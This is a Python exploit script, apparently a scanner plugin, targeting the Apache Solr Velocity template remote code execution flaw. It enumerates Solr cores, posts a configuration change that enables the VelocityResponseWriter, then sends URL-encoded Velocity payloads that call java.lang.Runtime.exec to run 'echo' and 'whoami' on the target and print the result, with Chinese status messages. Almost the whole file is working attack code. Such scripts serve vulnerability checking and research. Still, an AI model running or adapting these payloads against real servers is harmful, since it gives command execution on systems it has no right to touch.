#!/usr/bin/python3
'''
name: Solr RCE漏洞
description: Solr 远程代码执行漏洞
'''

import json
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class Solr_Rce_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
        }
        self.capta = get_capta()
        self.check_payload = "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + 'echo' + ' ' + self.capta + "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
        self.cmd_payload = "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + 'whoami' + "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
        self.flag = False

    def get_code_name(self):
        # http://10.10.20.166:8983
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        core_url = self.url + '/solr/admin/cores?_=1572502179076&indexInfo=false&wt=json'
        try:
            req = request.get(core_url, headers = self.headers)
            if req.status_code == 200 and 'responseHeader' in req.text and 'status' in req.text:
                json_str = json.loads(req.text)
                for i in json_str['status']:
                    core_name_url = self.url + '/solr/' + i + '/config'
                    print(core_name_url)
                    self.update_queryresponsewriter(core_name_url)
            else:
                print("不存在Solr远程代码执行漏洞")
        except Exception as e:
            print(e)
        finally:
            pass

    def update_queryresponsewriter(self, core_name_url):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
            'Content-Type': 'application/json'
        }
        payload = '''
        {
        "update-queryresponsewriter": {

            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
        }
        }'''
        try:
            req = request.post(core_name_url, headers = headers, data = payload)
            if req.status_code == 200 and 'responseHeader' in req.text:
                exp_url = core_name_url[:-7]
                self.send_exp(exp_url)
            else:
                print("不存在Solr远程代码执行漏洞")
        except Exception as e:
            print(e)
            print("不存在Solr远程代码执行漏洞")
        finally:
            pass

    def send_exp(self, exp_url):
        try:
            check_req = request.get(exp_url + self.check_payload, headers = self.headers)
            if check_req.status_code == 200 and self.capta in check_req.text:
                cmd_req = request.get(exp_url + self.cmd_payload, headers = self.headers)
                print("存在Solr远程代码执行漏洞,执行whoami结果是:", cmd_req.text)
                self.flag = True
            else:
                print("不存在Solr远程代码执行漏洞")
        except Exception as e:
            print(e)
            print("不存在Solr远程代码执行漏洞")
        finally:
            pass

    def run(self):
        self.get_code_name()
        if self.flag:
            return True
        else:
            return False

if __name__ == '__main__':
    Solr_Rce = Solr_Rce_BaseVerify('http://192.168.30.242:8983')
    Solr_Rce.run()


